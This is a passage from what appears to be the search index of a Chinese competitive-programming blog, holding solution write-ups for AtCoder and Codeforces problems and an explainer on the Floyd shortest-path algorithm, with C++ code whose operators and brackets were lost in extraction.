数组内的数有两种，$a$ 中只有一种。同理可得方案数为 \\dfrac{1}{2}{(A + 1)(B + 1)B}(2^m - 2) $a,b$ 数组内的数均有两种。设 $a$ 中存在 $x_1,x_2 (x_1 eq x_2)$，$b$ 中存在 $y_1,y_2 (y_1 eq y_2)$，则只有 $x_1 \\oplus y_2 = x_2 \\oplus y_1$ 时满足题意。交换一下可得 $x_1 \\oplus x_2 = y_1 \\oplus y_2$。由于每一位相互独立，所以设 $dp_{i,0/1,0/1,0/1,0/1}$ 表示考虑到第 $i$ 位时，$x_1,x_2,y_1,y_2$ 是否已经达到上界时的方案数，直接大力数位 dp 即可。需要注意的时，最后还需要枚举某一个数的个数，也就是乘上 \\sum \\limits_{i = 1}^{n - 1} \\binom {n}{i} \\times \\sum \\limits_{i = 1}^{m - 1} \\binom {m}{i} \\\\ = (2^n - 2)(2^m - 2)最终代码如下： #include bits/stdc++.h#define init(x) memset (x,-1,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 1e5 + 5;const int MOD = 998244353;inline int read ();int t,a[35],b[35];ll n,m,A,B,ans,inv_2 = 499122177,dp[35][2][2][2][2]; ll qpow (ll x,ll y) ll res = 1; while (y) if (y 1) res = res * x % MOD; x = x * x % MOD; y = 1; return res;int dfs (int x,bool lead,bool p1,bool p2,bool p3,bool p4) if (x = 30) return !lead;//不能均为 0 if (~dp[x][p1][p2][p3][p4]) return dp[x][p1][p2][p3][p4]; ll sum = 0; for (int d1 = 0;d1 = (p1 ? a[x] : 1);++d1) for (int d2 = 0;d2 = (p2 ? d1 : 1);++d2) for (int d3 = 0;d3 = (p3 ? b[x] : 1);++d3) for (int d4 = 0;d4 = (p4 ? d3 : 1);++d4) if ((d1 ^ d2) == (d3 ^ d4)) sum += dfs (x + 1,lead !(d1 ^ d2),p1 (d1 == a[x]),p2 (d2 == d1),p3 (d3 == b[x]),p4 (d4 == d3)),sum %= MOD; return dp[x][p1][p2][p3][p4] = sum;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();m = read ();A = read ();B = read (); ans = (A + 1) * (B + 1) % MOD; ans += (A + 1) * (B + 1) % MOD * B % MOD * inv_2 % MOD * (qpow (2,m) - 2 + MOD) % MOD;ans %= MOD; ans += (B + 1) * (A + 1) % MOD * A % MOD * inv_2 % MOD * (qpow (2,n) - 2 + MOD);ans %= MOD; for (int i = 0;i 30;++i,A = 1) a[29 - i] = A 1; for (int i = 0;i 30;++i,B = 1) b[29 - i] = B 1; init (dp); ans += dfs (0,1,1,1,1,1) * (qpow (2,m) - 2 + MOD) % MOD * (qpow (2,n) - 2 + MOD) % MOD;ans %= MOD; printf (%lld ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：[ABC395G] Minimum Steiner Tree 2","path":"/2025/03/03/ABC395G/","content":"$K$ 的数据范围异常小，引导我们往状压上思考。 设 $dp_{st,y}$ 表示已经包含 $1\\sim k$ 以及 $x$ ，与 $y$ 建立联系的最小花费，其中 $1\\sim k$ 以及 $x$ 可以用 $2^{k + 1}$ 种状态来表示。枚举 $st$ 中包含 $x$，存在以下两种方式： 对于同一个 $y$，通过子集枚举来转移： dp_{st,y} = dp_{T,y} + dp_{st\\oplus T,y} 对于不同的 $y$，需要一个中间点 $k$，这就想到可以通过最短路的方式进行状态的更新： dp_{st,y} = dp_{st,k} + C_{k,y}最后的时间复杂度为 $O(n^2 3^k + n^2 2^k \\log n)$，代码如下： #include bits/stdc++.h#define init(x) memset (x,INF,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f3f3f3f3f#define pii pair ll,intusing namespace std;const int MAX = 85;const int MOD = 1e9 + 7;inline int read ();int n,m,q,c[MAX][MAX],vis[MAX];ll ans[MAX][MAX],dp[1 9][MAX];//dp[st][y] 已经包含 1-k（包含一个 x) ，与 y 建立联系的最小花费 //dp[st][y] = dp[T][y] + dp[T ^ st][y] O(3^k)//dp[st][y] = dp[sy][k] + dis[k][y] void dijkstra (ll *dis);void solve (int x);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 0;i n;++i) for (int j = 0;j n;++j) c[i][j] = read (); for (int i = 0;i n;++i) solve (i); q = read (); while (q--) int x = read (),y = read (); printf (%lld ,ans[--x][--y]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;void solve (int x) //[st] 包含 x init (dp); dp[1 m][x] = 0; for (int i = 0;i m;++i) dp[1 i][i] = 0; for (int S = 0;S (1 (m + 1));++S) for (int i = 0;i n;++i) for (int T = S (S - 1);T;T = (T - 1) S) dp[S][i] = min (dp[S][i],dp[T][i] + dp[T ^ S][i]); dijkstra (dp[S]); for (int i = 0;i n;++i) ans[x][i] = dp[(1 (m + 1)) - 1][i];void dijkstra (ll *dis) priority_queue pii q; for (int i = 0;i n;++i) q.push (-dis[i],i),vis[i] = 0; while (!q.empty ()) int u = q.top ().second;q.pop (); if (vis[u]) continue; vis[u] = 1; for (int v = 0;v n;++v) if (dis[v] dis[u] + c[u][v]) dis[v] = dis[u] + c[u][v],q.push (-dis[v],v);","categories":["Solution"]},{"title":"题解：CF2069F Graph Inclusion","path":"/2025/02/24/CF2069F/","content":"对于一组询问，答案为 $A$ 中连通块的数量 - $A \\cup B$ 中的连通块数量。 设在 $A$ 中添加了若干条边后变为 $A’$。当两个顶点 $u,v$ 在 $A$ 或 $B$ 中属于同一个连通分量，那么在 $A’$ 中必同属于一个连通分量。因此，我们不难得出上述结论。 由于存在动态的加边删边，不难想到时间戳的线段树分治。对于在某一张图的边，记录下出现时间和消失时间 $l,r$，则由题目可知，该边在 $[l,r - 1]$ 范围内产生贡献。注意，若一条边在加入之后一直存在，则该边在 $[l,q]$ 范围内产生贡献。 至于如何计算连通块的个数，初始值显然为 $n$。与此同时，可以在并查集的合并时增加一个返回值，若形成一次有效的合并时，连通块的个数便会减少 $1$。 由于需要分别维护 $A$ 和 $A \\cup B$ 的连通块数量，我们可以先求解出 $A$，然后在此基础上加入 $B$ 的边即可得到 $A \\cup B$ 的答案。 由于并查集不能路径压缩，最后时间复杂度为 $O(q \\log q \\log n)$，代码如下： #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,int using namespace std;const int MAX = 4e5 + 5;const int MOD = 1e9 + 7;inline int read ();pii st[MAX],e[MAX]; vector pii ve[MAX 2];map pii,int mp;int n,q,top,ans[3][MAX],fa[MAX],sz[MAX];char ty[MAX][1];int getfa (int u);bool merge (int u,int v);void modify (int cur,int l,int r,int x,int y,pii v);void solve (int res[],int cur,int l,int r,int tot);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();q = read (); for (int i = 1;i = n;++i) fa[i] = i,sz[i] = 1; for (int i = 1;i = q;++i) scanf (%s,ty[i]);int u = read (),v = read (); if (u v) swap (u,v); e[i] = u,v; for (int i = 1;i = q;++i) if (ty[i][0] == B) continue; if (!mp[e[i]]) mp[e[i]] = i; else modify (1,1,q,mp[e[i]],i - 1,e[i]); mp[e[i]] = 0; for (auto item : mp) if (item.second) modify (1,1,q,item.second,q,item.first); solve (ans[1],1,1,q,n); mp.clear (); for (int i = 1;i = q;++i) if (ty[i][0] == A) continue; if (!mp[e[i]]) mp[e[i]] = i; else modify (1,1,q,mp[e[i]],i - 1,e[i]); mp[e[i]] = 0; for (auto item : mp) if (item.second) modify (1,1,q,item.second,q,item.first); solve (ans[2],1,1,q,n); for (int i = 1;i = q;++i) printf (\\t%d ,ans[1][i] - ans[2][i]);//A - A U B return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;int getfa (int u) return fa[u] == u ? u : getfa (fa[u]); bool merge (int u,int v) u = getfa (u),v = getfa (v); if (u == v) return 0; if (sz[u] sz[v]) swap (u,v); st[++top] = u,v;// u - v fa[u] = v;sz[v] += sz[u]; return 1;void modify (int cur,int l,int r,int x,int y,pii v) if (x = l y = r) ve[cur].push_back (v);return ; int mid = (l + r) 1; if (x = mid) modify (cur 1,l,mid,x,y,v); if (y mid) modify (cur 1 | 1,mid + 1,r,x,y,v); void solve (int res[],int cur,int l,int r,int tot) int la = top; for (auto p : ve[cur]) tot -= merge (p.first,p.second); if (l == r) res[l] = tot; else int mid = (l + r) 1; solve (res,cur 1,l,mid,tot);solve (res,cur 1 | 1,mid + 1,r,tot); while (top la) sz[st[top].second] -= sz[st[top].first]; fa[st[top].first] = st[top].first; --top;","categories":["Solution"]},{"title":"题解：[ABC394G] Dense Buildings","path":"/2025/02/23/ABD394G/","content":"通过观察，首先可以得出几个小结论： $(a_i,b_i,y_i) \\to (c_i,d_i,z_i)$ 的其中一条最优路径一定是 $(a_i,b_i,y_i) \\to (a_i,b_i,w) \\to (c_i,d_i,w) \\to (c_i,d_i,z_i)$。 $w$ 越小，越有可能合法，满足单调性，因此可以二分答案，最后单组询问的答案即为 $y_i + z_i - 2 \\times w$。 对于单组询问，可以从高到低进行相邻块合并，因此最后的答案检测可以转换为并查集检验两点的连通性。总共的时间复杂度为 $O(QV \\alpha(HW) \\log (V))$（其中 $V$ 便是高度的值域）。 考虑优化，不难发现各组询问直接相互独立，且可以离线操作，所以我们可以使用整体二分。首先将每组答案的 $l_i = 1,r_i = \\min (y_i,z_i)$，对于一次二分操作，若此时 $l_i \\le r_i$ 仍然成立，那么我们就尝试将 $\\frac{l_i + r_i}{2}$ 作为该组询问的答案。检验的过程和单组询问大致相同，可以从高到低进行相邻块合并后检验连通性即可。时间复杂度就降到了 $O(Q\\alpha(HW) \\log (V))$，代码如下： #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long longusing namespace std;const int M = 1e6;const int MAXN = 505;const int MAXQ = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n,m,q,fl;int fa[M + 5],sx[MAXQ],sy[MAXQ],sh[MAXQ],fx[MAXQ],fy[MAXQ],fh[MAXQ],l[MAXQ],r[MAXQ],ans[MAXQ],a[MAXN][MAXN];vector pair int,int f[M + 5];vector int res[M + 5];int getfa (int u) return fa[u] == u ? u : fa[u] = getfa (fa[u]); void merge (int u,int v) u = getfa (u),v = getfa (v); if (u != v) fa[u] = v;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); n = read ();m = read (); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) a[i][j] = read (); for (int i = 1;i = n;++i) for (int j = 1;j = m;++j) if (i != n) f[min (a[i][j],a[i + 1][j])].push_back ((i - 1) * m + j,i * m + j); if (j != m) f[min (a[i][j],a[i][j + 1])].push_back ((i - 1) * m + j,(i - 1) * m + j + 1);//相邻块的预处理 q = read (); for (int i = 1;i = q;++i) sx[i] = read (),sy[i] = read (),sh[i] = read (); fx[i] = read (),fy[i] = read (),fh[i] = read (); l[i] = 1,r[i] = min (sh[i],fh[i]);//边界 while (!fl) //仍然有询问需要二分 fl = 1; for (int i = 1;i = q;++i) if (l[i] r[i]) continue; int mid = (l[i] + r[i]) 1; res[mid].push_back (i); fl = 0; for (int i = 1;i = M;++i) fa[i] = i; for (int i = M;i = 1;--i) for (auto item : f[i]) merge (item.first,item.second); for (auto p : res[i]) // 第 p 个询问答案为 i 是否成立 int u = (sx[p] - 1) * m + sy[p],v = (fx[p] - 1) * m + fy[p]; u = getfa (u),v = getfa (v); if (u == v) ans[p] = i,l[p] = i + 1; else r[p] = i - 1; for (int i = 1;i = M;++i) res[i].clear (); for (int i = 1;i = q;++i) printf (%d ,sh[i] + fh[i] - 2 * ans[i]); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF2066C Bitwise Slides","path":"/2025/02/14/CF2066C/","content":"首先考虑暴力的转移，当枚举到第 $i$ 个数时，我们尝试将之前所有的有效状态的 $P,Q,R$ 均与 $a_i$ 尝试去异或，然后检测合法性。于是就有： la[0,0,0] = 1;for (int i = 1;i = n;++i) for (auto item : la) node v = item.first; int x = v.p,y = v.q,z = v.r; if (y == z || (x ^ a[i]) == y || (x ^ a[i]) == z) dp[x ^ a[i],y,z] += la[v]; if (x == z || (y ^ a[i]) == x || (y ^ a[i]) == z) dp[x,y ^ a[i],z] += la[v]; if (x == y || (z ^ a[i]) == x || (z ^ a[i]) == y) dp[x,y,z ^ a[i]] += la[v]; for (auto item : dp) dp[item.first] %= MOD; la.clear ();la = dp;dp.clear (); 但这样显然会有很多冗余的转移以及判断，考虑异或的性质去优化。 回顾一下题面，对于一个数字只能选择 $P,Q,R$ 中的一个去异或，那么处理完 $a_i$ 后，$P \\oplus Q \\oplus R = \\oplus _{j = 1}^i a_j = p_i$。由于 $P,Q,R$ 不能两两互异，此时设 $(P,Q,R)$ 中相同的数为 $x$，由于 $x \\oplus y \\oplus y = x$，故可能的有效状态为 $(x,x,p_i),(x,p_i,x),(p_i,x,x)$ 中的一个。 设 $dp_{i,x}$ 表示在处理第 $i$ 个数后相同的数为 $x$ 的方案数。则 $(x,x,p_i)$ 的上一个状态可能为 $(x \\oplus a_i,x,p_i)$ 或 $(x,x,p_i \\oplus a_i)$。 上一个状态为 $(x \\oplus a_i,x,p_i)$ 由于要保证状态的合法性，需要分类讨论具体是哪两个数相同： $x \\oplus a_i = x \\Rightarrow a_i = 0$，与题干矛盾，故不可能成立。 $x \\oplus a_i = p_i \\Rightarrow x = p_{i - 1}$，此时转移方程为 $dp_{i,x} = dp_{i,p_{i - 1}} = dp_{i-1,p_i}$。 $x = p_i$，此时转移方程为 $dp_{i,x} = dp_{i,p_i} = dp_{i - 1,p_i}$ 上一个状态为 $(x,x,p_i \\oplus a_i)$ 显然，转移方程为 $dp_{i,x} = dp_{i - 1,x}$。 通过观察可以发现，$dp_{i,x} \\leftarrow dp_{i - 1,x}$ 不成立当且仅当 $x = p_{i - 1}$ 的情况，其余直接继承。最终状态为 $(x,x,p_i)$，代入 $x$ 后是 $(p_{i - 1},p_{i - 1},p_i)$。由 $(p_{i - 1},p_{i - 1},p_{i - 1})$ 转移共有三种方式，而由 $(p_{i - 1},p_i,p_i)$ 转移共有两种方式。同时，可以发现可以利用滚动数组优化，因此可以有： dp_{p_{i - 1}} = 2 \\times dp_{p_i} + 3 \\times dp_{p_{i - 1}}当然，初始条件为 $dp_{0} = 1$。数字过大，离散化或者直接用 map 即可。代码如下： #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int t,n,a[MAX],p[MAX];ll ans;map int,ll dp;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); t = read (); while (t--) n = read ();ans = 0;dp.clear (); for (int i = 1;i = n;++i) a[i] = read (),p[i] = p[i - 1] ^ a[i]; dp[0] = 1; for (int i = 1;i = n;++i) dp[p[i - 1]] = (dp[p[i]] * 2 + dp[p[i - 1]] * 3) % MOD; for (auto item : dp) ans = (ans + item.second) % MOD; printf (%lld ,ans); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF2063F1 Counting Is Not Fun (Easy Version)","path":"/2025/02/03/CF2063F1/","content":"所有方案数均基于卡特兰数，不妨设 $F(x) = \\dfrac{\\tbinom{2x}{x}}{x + 1}$ 来表示卡特兰数。 初始时显然答案为 $F(n)$。当有括号加入时，未被添加括号的位置的贡献不会超过最外层已匹配的括号。举个例子，当 $?????? \\to \\color{red}{(}??\\color{red}??$ 时，答案就变化为 $F(3) \\to F(1) \\times F (1)$。 因此可以先将这 $n$ 对括号进行编号，然后借助栈，当遇到未被添加括号的位置时，将贡献加在栈顶的括号对应的编号上，最后根据乘法原理求解即可。 时间复杂度 $O(n^2)$，代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#include stack#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 5005;const int MOD = 998244353;inline int read ();int t,n,p[MAX 1],l[MAX],r[MAX],cnt[MAX];ll ans,f[MAX 1],inv[MAX 1],inv2[MAX 1]; stack int s;ll qpow (ll x,ll y) ll res = 1; while (y) if (y 1) res = res * x % MOD; x = x * x % MOD; y = 1; return res;ll catalan (int x) return f[2 * x] * inv[x] % MOD * inv[x] % MOD * inv2[x + 1] % MOD; int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); f[0] = inv[0] = 1; for (int i = 1;i = 10000;++i) f[i] = f[i - 1] * i % MOD,inv2[i] = qpow (i,MOD - 2); inv[10000] = qpow (f[10000],MOD - 2); for (int i = 9999;i;--i) inv[i] = inv[i + 1] * (i + 1) % MOD; s.push (0);//最外层的贡献 t = read (); while (t--) n = read (); for (int i = 1;i = n;++i) l[i] = read (),r[i] = read (); for (int i = 1;i = 2 * n;++i) p[i] = 0; for (int o = 0;o = n;++o) for (int i = 0;i = n;++i) cnt[i] = 0; p[l[o]] = o;p[r[o]] = -o;ans = 1;//新添加的括号进行标记 for (int i = 1;i = 2 * n;++i) if (!p[i]) ++cnt[s.top ()];//未被添加的位置 else if (p[i] 0) s.pop ();//已经匹配，弹出即可 else s.push (p[i]); for (int i = 0;i = n;++i) ans = ans * catalan (cnt[i] / 2) % MOD;//注意左右括号各贡献一次，因此需要除以 2 printf (%lld ,ans); puts (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"题解：CF2057D Gifts Order","path":"/2025/01/07/CF2057D/","content":"这是一篇 DDP 做法的题解。 首先需要想通的一个点就是最值一定出现在端点处，否则区间长度变化而极差不变，会导致答案更劣。 设最值所在的位置为 $l,r$，则会有两种情况： 若最大值在最小值左侧，则答案为 $a_l - a_r - (r - l) = (a_l + l) - (a_r + r)$。 若最大值在最小值右侧，则答案为 $a_r - a_l - (r - l) = (a_r - r) - (a_l - l)$。 不难发现我们只需要维护 $a_i + i$ 和 $a_i - i$ 即可。 当本题不存在修改操作时，就是 虹色的北斗七星。设 $f_{i,0}$ 表示 $[1,i]$ 中 $a_i + i$ 的最大值，$f_{i,1}$ 表示 $[1,i]$ 中 $a_i - i$ 的最小值，$f_{i,2}$ 表示 $[1,i]$ 中答案的最大值。于是我们可以得到转移方程： \\begin{cases} f_{i,0} = \\max \\ \\{\\ f_{i - 1,0},a_i + i\\ \\}\\\\ f_{i,1} = \\min \\ \\{\\ f_{i - 1,1},a_i - i\\ \\}\\\\ f_{i,2} = \\max \\ \\{\\ f_{i - 1,2},f_{i - 1,0} - (a_i + i),(a_i - i) - f_{i - 1,1}\\ \\} \\end{cases}最后的答案便是 $f_{n,2}$。进一步可以发现 $f_{i,0/1/2}$ 的值只依赖于前一项，因此我们可以滚动数组优化空间，最后时间复杂度为 $O(n)$，空间复杂度为 $O(1)$。为了更好的为 DDP 做准备，可以通过增加负号的方式改写转移方程，使得均变为取 $\\max$ 的形式： \\begin{cases} f_{i,0} = \\max \\ \\{\\ f_{i - 1,0},a_i + i\\ \\}\\\\ f_{i,1} = \\color{red}\\max\\color{black} \\ \\{\\ f_{i - 1,1},\\color{red}-\\color{black}(a_i - i)\\ \\}\\\\ f_{i,2} = \\max \\ \\{\\ f_{i - 1,2},f_{i - 1,0} - (a_i + i), (a_i - i)\\color{red}{+}\\color{black}f_{i - 1,1}\\ \\} \\end{cases}于是可以得到 虹色的北斗七星 的核心代码【注意初始化】： f[0][1] = -INF;for (int i = 1;i = n;++i) int x = read (); f[i 1][0] = max (f[(i + 1) 1][0],x + i); f[i 1][1] = max (f[(i + 1) 1][1],-(x - i)); f[i 1][2] = max (f[(i + 1) 1][2],max (f[(i + 1) 1][0] - (x + i),(x - i) + f[(i + 1) 1][1]));printf (%d ,f[n 1][2] - 1); 既然已经写成了可以迭代的形式，那么就可以改写成矩阵去维护。当然，这里的矩阵乘法需要被重载为相加取最大值的形式。如下： \\begin{bmatrix} 0 & -\\infty & -\\infty & a_i + i\\\\ -\\infty & 0 & -\\infty & -(a_i - i)\\\\ -(a_i + i) & a_i - i & 0 & -\\infty\\\\ -\\infty & -\\infty & -\\infty & 0 \\end{bmatrix} \\begin{bmatrix} f_{i - 1,0}\\\\ f_{i - 1,1}\\\\ f_{i - 1,2}\\\\ 0 \\end{bmatrix} = \\begin{bmatrix} f_{i,0}\\\\ f_{i,1}\\\\ f_{i,2}\\\\ 0 \\end{bmatrix}由于转移的方程式仍然满足矩阵的结合律，因此用线段树单点修改就可以维护矩阵。但需要注意的是，矩阵不满足交换律，因此需要注意线段树更新时的顺序！令 $m = 4$，则单组数据的时间复杂度为 $O(m^3 q \\log n)$。 最后放个代码吧： #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();struct Mat int a[4][4]; Mat () init (a); void clear () init (a); tree[MAX 2],I,A;int t,n,q,a[MAX]; Mat operator * (Mat A,Mat B);void build (int cur,int l,int r);void modify (int cur,int l,int r,int x,int v);int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); I.a[0][1] = I.a[0][2] = I.a[1][0] = I.a[1][2] = I.a[2][3] = I.a[3][0] = I.a[3][1] = I.a[3][2] = -INF; t = read (); while (t--) n = read ();q = read (); for (int i = 1;i = n;++i) a[i] = read (); build (1,1,n); Mat ans;ans.a[1][0] = -INF; ans = tree[1] * ans; printf (%d ,ans.a[2][0]); while (q--) int x = read (),v = read (); modify (1,1,n,x,v); Mat ans;ans.a[1][0] = -INF;//注意初始化 ans = tree[1] * ans; printf (%d ,ans.a[2][0]); for (int i = 1;i = 4 * n;++i) tree[i].clear (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;Mat operator * (Mat A,Mat B) Mat C; for (int i = 0;i 4;++i) for (int j = 0;j 4;++j) C.a[i][j] = -INF; for (int i = 0;i 4;++i) for (int j = 0;j 4;++j) for (int k = 0;k 4;++k) C.a[i][j] = max (C.a[i][j],A.a[i][k] + B.a[k][j]);//重载为相加后取最大值 return C;void build (int cur,int l,int r) if (l == r) tree[cur] = I; tree[cur].a[0][3] = a[l] + l;tree[cur].a[1][3] = -(a[l] - l); tree[cur].a[2][0] = - (a[l] + l);tree[cur].a[2][1] = a[l] - l; return ; int mid = (l + r) 1; build (cur 1,l,mid);build (cur 1 | 1,mid + 1,r); tree[cur] = tree[cur 1 | 1] * tree[cur 1];//注意顺序！！！ void modify (int cur,int l,int r,int x,int v) if (l == r) a[l] = v;tree[cur] = I;//一些负无穷的处理放在 I 中 tree[cur].a[0][3] = a[l] + l;tree[cur].a[1][3] = -(a[l] - l); tree[cur].a[2][0] = - (a[l] + l);tree[cur].a[2][1] = a[l] - l; return ; int mid = (l + r) 1; if (x = mid) modify (cur 1,l,mid,x,v); else modify (cur 1 | 1,mid + 1,r,x,v); tree[cur] = tree[cur 1 | 1] * tree[cur 1];//注意顺序！！！","categories":["Solution"]},{"title":"你真的懂 Floyd 吗","path":"/2025/01/06/Floyd/","content":"Floyd 求最短路，时间复杂度 $O(n^3)$，空间复杂度 $O(n^2)$。 for (int k = 1;k = n;++k) for (int i = 1;i = n;++i) for (int j = 1;j = n;++j) dis[i][j] = min (dis[i][j],dis[i][k] + dis[k][j]); 【Q1】该算法的正确性？ 算法基于动态规划。设 $f_{k,i,j}$ 表示只能借助于 $1,2,\\cdots,k$ 点时，$i \\to j$ 的最短路径。那么根据是否经过 $k$ 点，可以列出状态转移方程： f_{k,i,j} = \\min (f_{k - 1,i,j},f_{k - 1,i,k} + f_{k - 1,k,j})很好理解，后者相当于以 $k$ 作为中转站，即 $i \\to k \\to j$ 的转移。那么当处理询问 $u,v$ 时，$f_{n,u,v}$ 即为所求。 可以发现 $f_{k,i,j}$ 只对 $f_{k - 1,i’,j’}$ 产生依赖，不难想到可以滚动数组优化。那么，Floyd 最终直接删去那一维，这样做不会出错吗？ 现在我们去掉第一维，只要保证在转移时方程右侧的 $f_{i,j},f_{i,k},f_{k,j}$ 都是未被覆盖过的即可。当最外层为第 $k$ 次循环时，显然 $f_{i,j}$ 还未被覆盖。对于 $f_{i,k},f_{k,j}$，按照之前的三维转移方程，可以得到 $f_{k,i,k} = \\min (f_{k - 1,i,k},f_{k - 1,i,k} + f_{k - 1,k,k}) = f_{k - 1,i,k}$，$f_{k,j}$ 同理。因此我们证明了空间优化的该算法的正确性。 与此同时，从动态规划的角度出发，“为什么 $k$ 循环需要放在最外层？”也就很好理解了。 【Q2】若每次修改一条边的权值，有必要重新完整的去做一遍 Floyd 算法吗？ 答案是否定的，只需要 $O(n^2)$ 即可实现局部更新。设 $(u,v)$ 的权值更新为 $w(u,v)$（无向图），则可得到转移方程： f_{i,j} = \\min (f_{i,j},\\min (f_{i,u} + w(u,v) + f_{v,j},f_{i,v} + w(v,u) + f_{u,j}))例题： Another Exercise on Graphs (easy version)Another Exercise on Graphs (hard version) 解析： 根据边权排序，然后答案显然就是某一条边的值。当枚举到第 $i$ 条边的时候，比其小的边均置为 $0$，否则为 $1$。若 $i \\to j$ 的最短路是 $w_i$，那么第 $i + 1$ 大的便是这条边。 进一步的，$\\texttt{E2}$ 的 $m$ 很大，可是我们会发现有效的更新只有 $n - 1$ 次，因为之后 $(i,j)$ 的最短路已经为 $0$，不会再发生变化，并查集维护即可。 【Q3】变式 $1$ 【模板】传递闭包 简单来说，如果原关系图上有 $i$ 到 $j$ 的路径，则其传递闭包的关系图上就应有从 $i$ 到 $j$ 的边，均用 $0/1$ 表示。因此枚举中转点 $k$，若 $(i,k)$ 与 $(k,j)$ 均有连边，则可将 $(i,j)$ 连边。写成表达式，就是： f_{i,j} = \\max (f_{i,j},\\min (f_{i,k},f_{k,j}))【Q4】变式 $2$ [USACO07NOV] Cow Relays G 本质同 Walk 设 $A$ 中是经过 $x$ 条边的最短路，$B$ 中是经过 $y$ 条边的最短路。通过以下转移后，可以发现 $C$ 中是经过 $x + y$ 条边的最短路： C_{i,j} = \\min ({C_{i,j}},A_{i,k} + B_{k,j})这样我们的转移就变得简单，重载后直接通过矩阵快速幂即可解决问题。 进一步的变式 [SCOI2009] 迷路，衡量距离。拆点与 bitset 的优化，时间复杂度 $O(\\frac{n^3}{64} \\log k)$。具体来说，对于一个点，拆成 $v_1 \\sim v_{10}$，然后 $u \\to v$ 一条边为 $w$ 的边，然后 $v_i \\to v_{i - 1}$ 进行连边，于是可以变为 $u \\to v_w$。","categories":["Algorithm"]},{"title":"题解：[ABC387E] Digit Sum Divisible 2","path":"/2025/01/05/ABC387E/","content":"可以尝试通过构造解决此题。 考虑到一个数能被 $9$ 整除是各个数位上和为 $9$ 的倍数，一个数整除 $8$ 只需要末三位均为 $0$ 即可。因此大致的方向就是去构造 $x,8 - x,0,0,\\cdots,0,0,0$ 的一个数来满足条件。【为什么选择 $8$：相较于 $4$，$8$ 的拆分比较多，因此更容易满足条件。】 再来考虑 $[N,2N]$ 这个范围的限制。设 $N$ 的最高位 $p$，则： 当 $p \\ge 7$ 时，构造 $107\\underbrace{00\\cdots000}_{n-2}$ 总能符合条件。 当 $2 \\le p \\le 7$ 以及 $17,18,19$ 开头的数，构造 $p + 1,7 - p,\\underbrace{0,0,\\cdots,0,0,0}_{n - 2}$ 总能符合条件。 $p=1$ 的其余情况，构造 $17\\underbrace{00\\cdots000}_{n-2}$ 总能符合条件。 当然，$N$ 较小的时候难以构造出上述条件，直接跑暴力即可。 代码如下： #include iostream#include cstdio#include algorithm#include cmath#include cstring#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int n;char s[MAX]; int calc (int x) int res = 0; while (x) res += x % 10,x /= 10; return res;int main () //freopen (.in,r,stdin); //freopen (.out,w,stdout); scanf (%s,s + 1);n = strlen (s + 1); if (n = 6) int num = 0; for (int i = 1;i = n;++i) num = num * 10 + s[i] - 0; for (int i = num;i 2 * num;++i) if (i % calc (i) == 0 (i + 1) % calc (i + 1) == 0) printf (%d ,i);return 0; puts (-1); return 0; if (s[1] = 7) printf (107); for (int i = 1;i = n - 2;++i) printf (0); puts (); else if (s[1] = 2 || (s[1] == 1 s[2] = 7)) int dig = s[1] - 0 + 1; printf (%d%d,dig,8 - dig); for (int i = 1;i = n - 2;++i) printf (0); puts (); else printf (17); for (int i = 1;i = n - 2;++i) printf (0); puts (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while 